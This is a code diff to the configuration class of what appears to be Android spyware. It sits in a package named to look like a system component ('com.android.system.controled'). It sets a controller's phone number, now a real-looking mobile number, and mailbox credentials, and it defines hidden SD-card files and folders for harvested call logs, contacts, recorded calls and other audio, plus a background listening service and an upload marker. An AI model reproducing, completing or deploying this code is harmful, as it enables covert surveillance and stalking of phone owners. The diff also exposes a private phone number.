@@ -10,6 +10,7 @@ import android.media.AudioManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.NetworkInfo.State;
+import android.os.Environment;
 import android.util.Log;
 
 import com.android.system.controled.service.ListenService;
@@ -19,8 +20,8 @@ import com.android.system.controled.util.FileUtil;
 
 public class Globle {
 
-	// public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
-	public static final String PHONE_NUMBER = "5554";// 控制者的电话号码
+	public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
+	// public static final String PHONE_NUMBER = "5554";// 控制者的电话号码
 
 	/**
 	 * 发送者的email和密码，163邮箱
@@ -67,14 +68,14 @@ public class Globle {
 
 	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";
 
-	public static final File FILE_CALL_LOG = new File("/mnt/sdcard/Android/.androidcall.txt");
-	public static final File FILE_CONTACTS = new File("/mnt/sdcard/Android/.contacts.txt");
-	public static final String FILEPATH_AUDIOS_CALL = "/mnt/sdcard/Android/.callaudios/";
-	public static final String FILEPATH_AUDIOS_OTHER = "/mnt/sdcard/Android/.audios/";
+	public static final String FILE_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
+	
+	public static final File FILE_CALL_LOG = new File(FILE_SDCARD + ".androidcall.txt");
+	public static final File FILE_CONTACTS = new File(FILE_SDCARD + ".contacts.txt");
+	public static final String FILEPATH_AUDIOS_CALL = FILE_SDCARD + ".callaudios/";
+	public static final String FILEPATH_AUDIOS_OTHER = FILE_SDCARD + ".audios/";
 	public static final File FILE_TAG_UPLOAD_TAG = new File("/data/data/com.android.system.controled/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
-
-	
 
 	/**
 	 * 开启后台监听服务
@@ -126,5 +127,5 @@ public class Globle {
 		}
 		return false;
 	}
- 
+
 }
